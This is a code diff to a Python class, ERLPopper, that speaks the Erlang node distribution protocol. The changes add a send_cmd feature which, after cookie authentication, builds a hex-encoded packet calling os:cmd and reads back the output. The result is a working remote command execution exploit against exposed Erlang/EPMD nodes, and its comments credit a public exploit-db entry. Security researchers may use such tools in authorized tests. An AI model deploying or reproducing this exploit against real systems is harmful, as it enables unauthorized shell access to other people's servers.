@@ -3,9 +3,10 @@ from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
 from struct import pack, unpack
 from string import ascii_uppercase
 from hashlib import md5
+from binascii import hexlify, unhexlify
 
 class ERLPopper:
-    UTF8    = "utf-8"
+    _UTF8    = "utf-8"
 
     class Error(Exception):
         pass
@@ -100,7 +101,7 @@ class ERLPopper:
                            |        ||  |   |  |-- DFLAG_EXTENDED_PIDS_PORTS 
                            |        ||  |   |-- DFLAG_NEW_FLOATS 
                            |        ||  |-- DFLAG_SMALL_ATOM_TAGS
-                           |        ||-- DFLAG_UTF8_ATOMS
+                           |        ||-- DFLAG__UTF8_ATOMS
                            |        |-- DFLAG_MAP_TAG 
                            |-- DFLAG_HANDSHAKE_23
 
@@ -135,7 +136,7 @@ class ERLPopper:
                            | || | ||||  |||-- DFLAG_UNICODE_IO**-
                            | || | ||||  ||-- DFLAG_DIST_HDR_ATOM_CACHE**-
                            | || | ||||  |-- DFLAG_SMALL_ATOM_TAGS
-                           | || | ||||-- DFLAG_UTF8_ATOMS
+                           | || | ||||-- DFLAG__UTF8_ATOMS
                            | || | |||-- DFLAG_MAP_TAG
                            | || | ||-- DFLAG_BIG_CREATION**+
                            | || | |-- DFLAG_SEND_SENDER**-
@@ -153,8 +154,8 @@ class ERLPopper:
         if not name:
             name = self.node_name
 
-        #packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0x3499c) + bytes(name, self.UTF8)
-        packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0x7499c) + bytes(name, self.UTF8)
+        #packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0x3499c) + bytes(name, self._UTF8)
+        packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0x7499c) + bytes(name, self._UTF8)
 
         return packet
 
@@ -194,7 +195,7 @@ class ERLPopper:
             name = self.node_name
 
         #name = "maik@ubu-brute01-maik"
-        packet = pack('!HcQIH', 15 + len(name), b'N', 0x103499c, 0xdeadbeef, len(name)) + bytes(name, self.UTF8)
+        packet = pack('!HcQIH', 15 + len(name), b'N', 0x103499c, 0xdeadbeef, len(name)) + bytes(name, self._UTF8)
 
         return packet
 
@@ -237,9 +238,9 @@ class ERLPopper:
         (tag, msg) = unpack(f'!c{msg_len-1}s', data[:msg_len])
 
         # We are expecting 's' tag
-        assert(tag.decode(self.UTF8) == 's')
+        assert(tag.decode(self._UTF8) == 's')
 
-        msg = msg.decode(self.UTF8)
+        msg = msg.decode(self._UTF8)
 
         self._log_verbose(f"    Received msg: '{repr(msg)}'")
 
@@ -264,14 +265,14 @@ class ERLPopper:
         self._log_verbose(f"    Received tag: '{tag}', version: '{version}', flags: '{flags}', challenge: '{challenge}', name: '{name}'")
         
         # We are expecting 'n' tag
-        assert(tag.decode(self.UTF8) == 'n')
+        assert(tag.decode(self._UTF8) == 'n')
 
         return challenge
 
     def _generate_challenge_reply_packet(self, challenge):
         m = md5()
-        m.update(self.cookie.encode(self.UTF8))
-        m.update(str(challenge).encode(self.UTF8))
+        m.update(self.cookie.encode(self._UTF8))
+        m.update(str(challenge).encode(self._UTF8))
         response = m.digest()
         self._log_verbose(f"    Generated digest: '{repr(response)}'")
 
@@ -312,7 +313,7 @@ class ERLPopper:
             self._log_verbose(f"    Received tag: '{tag}', digest: '{digest}'")
 
             # We are expecting 'a' tag
-            assert(tag.decode(self.UTF8) == 'a')
+            assert(tag.decode(self._UTF8) == 'a')
 
         return digest
         
@@ -325,6 +326,9 @@ class ERLPopper:
         if not cookie:
             cookie = self.cookie
 
+        # Set the cookie every time so if we re-use this object (like for send_cmd) we are already set up
+        #  Did the same thing with node_name
+        self.cookie = cookie
         self._log_verbose(f"  Trying cookie: '{repr(cookie)}'")
 
         # send_name
@@ -363,6 +367,142 @@ class ERLPopper:
 
         return result
 
+    def _encode_string(self, in_str, t=0x64):
+        # Taken from erl-matter/shell-erldp.py
+        return pack('!BH', t, len(in_str)) + bytes(in_str, self._UTF8)
+
+    def _generate_cmd_packet_old(self, cmd, name=None):
+        # Taken from erl-matter/shell-erldp.py
+        #  wetw0rk broke this down a lot better in his exploit, but both do the same job
+        #    https://www.exploit-db.com/exploits/46024
+        packet  = unhexlify('70836804610667')
+        packet += self._encode_string(name)
+        packet += unhexlify('0000000300000000006400006400037265')
+        packet += unhexlify('7883680267')
+        packet += self._encode_string(name)
+        packet += unhexlify('0000000300000000006805')
+        packet += self._encode_string('call')
+        packet += self._encode_string('os')
+        packet += self._encode_string('cmd')
+        packet += unhexlify('6c00000001')
+        packet += self._encode_string(cmd, 0x6b)
+        packet += unhexlify('6a')
+        packet += self._encode_string('user')
+  
+        return pack('!I', len(packet)) + packet
+
+    def _generate_cmd_packet_new(self, cmd, name=None):
+        raise NotImplementedError
+
+    def _recv_cmd_resp_old(self):
+        '''
+        ERTS <= 5.7.2 (OTP R13B) inter-node message format
+        "Old" message format
+
+        |-----------------|----|---------------|--------------------|
+        |\x00\x00\x00\0xnn|\x70|ControlMessage | Message            |
+        |-----------------|----|---------------|--------------------|
+                |           |          |            |
+                |           |          |            |-- "The message sent to another node using the '!' (in external format[??]).
+                |           |          |            |--   Notice that Message is only passed in combination with a ControlMessage 
+                |           |          |            |--   encoding a send ('!')."
+                |           |          |
+                |           |          |-- "A tuple passed using the external format of erlang."
+                |           |
+                |           |-- Type (0x70 == 112) "pass through"
+                |
+                |-- 4-byte length
+
+        '''
+        # https://erlang.org/doc/apps/erts/erl_dist_protocol.html#protocol-between-connected-nodes
+        # Receive 4 byte length
+        msg_len = self._sock.recv(4)
+        msg_len = int.from_bytes(msg_len, "big")
+        self._log_verbose(f"    Response msg_len: {msg_len}")
+
+        data = self._sock.recv(msg_len)
+        (t, msg) = unpack(f'!c{msg_len-1}s', data[:msg_len])
+        
+        # We are expecting a type of 0x70 (112) followed by ControlMessage and possibly Message
+        assert(t == b'\x70')
+        self._log_verbose(f"  msg: {repr(msg)}")
+
+        # Trying to shortcut the rest of this, but seems consistent on all 2 of my test systems. YMMV
+        #   Yes we could be more intelligent (and use the erl python module but it's not native)
+        # [TODO] Congrats you found it! Sorry!
+        # Find b'\x83'
+        msg = msg[msg.find(b'\x83')+1:]
+
+        # Find b'\x83' again!
+        msg = msg[msg.find(b'\x83')+1:]
+        
+        # Find 107 (STRING_EXT) and its 2 byte length
+        #  This may not be there if there's no output from the command.
+        #msg = msg[msg.find(b'\x6b')+3:]
+        string_ext_loc = msg.find(b'\x6b')
+        if string_ext_loc > -1:
+            msg = msg[string_ext_loc+3:]
+        else:
+            # Couldn't find STRING_EXT, return raw response
+            msg = data
+
+        self._log_verbose(f"  msg: {repr(msg)}")
+
+        return msg
+
+    def _recv_cmd_resp_new(self):
+        raise NotImplementedError
+
+    def _recv_cmd_resp(self):
+        '''
+        recv_cmd_resp_old
+        '''
+
+        res = ""
+
+        if self.version == 5:
+            res = self._recv_cmd_resp_old()
+        elif self.version == 6:
+            res = self._recv_cmd_resp_new()
+        else:
+            raise self.VersionError(version=self.version, message=f"Invalid version: '{repr(self.version)}")
+
+        return res
+
     def send_cmd(self, cmd, name=None):
+        self._log_verbose("send_cmd")
+
+        # cmd is required
+        assert(cmd)
+        #if not cmd:
+        #    raise ValueError("No command specified.")
+
+        # must have good cookie
+        assert(self.check_cookie())
+
+        self._log_verbose(f"  cmd: {cmd}, cookie: {self.cookie}, name: {self.node_name}")
+
+        #if not self.check_cookie():
+        #    raise 
+
+        # Do this after so the object is initialized to a ready state
         # self.node_name is set with ever self.send_name so don't need to track it
-        return
+        if not name:
+            name = self.node_name
+
+        packet = ""
+
+        if self.version == 5:
+            packet = self._generate_cmd_packet_old(cmd, name)
+        elif self.version == 6:
+            packet = self._generate_cmd_packet_new(cmd, name)
+        else:
+            raise self.VersionError(version=self.version, message=f"Invalid version: '{repr(self.version)}")
+
+        # Send the command payload
+        self._sock.sendall(packet)
+
+        # Receive and decode the output (if any)
+        res = self._recv_cmd_resp()
+
+        return res
